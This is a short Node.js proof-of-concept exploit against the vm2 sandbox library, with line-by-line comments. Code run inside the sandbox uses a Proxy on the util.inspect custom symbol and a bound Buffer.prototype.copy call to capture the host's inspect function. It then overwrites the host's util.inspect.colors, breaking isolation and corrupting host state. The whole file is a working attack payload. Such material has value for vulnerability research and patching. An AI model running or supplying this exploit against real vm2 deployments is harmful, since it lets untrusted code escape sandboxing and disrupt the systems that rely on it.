const { VM } = require("vm2");
const vm = new VM();

// Define the code to be executed within the VM instance
const code = `
  let proxiedInspect; // Initialize a variable to hold the proxied inspect function
  const source = new Proxy(() => {}, { // Create a Proxy object to intercept property access
    get: function (target, prop, receiver) {
      if (prop === Symbol.for("nodejs.util.inspect.custom")) { // If the property accessed is 'Symbol.for("nodejs.util.inspect.custom")'
        return function (depth, options, inspect) { // Return a custom function
          proxiedInspect = inspect; // Assign the inspect function to the proxiedInspect variable
        };
      }
      return Reflect.get(...arguments); // Return the result of the property access
    },
  });
  try {
    // Attempt to bind the source object to the copy method of Buffer.prototype
    Buffer.prototype.copy.bind(source)({});
    // This triggers util.inspect:
    // The copy method of Buffer.prototype eventually triggers util.inspect in the nodejs codebase
    // This can lead to unexpected behavior if util.inspect is modified
  } catch {} // Catch any errors thrown during execution
  // Break util.inspect.colors of the host context
  for (const key in proxiedInspect.colors) { // Iterate over the keys in the colors object of proxiedInspect
    proxiedInspect.colors[key] = [{ toString: 1 }]; // Modify each color property to be an array with a toString method
  }
`;

// Execute the code within the VM instance
vm.run(code);

console.log(1); // Output a test statement to ensure execution continues
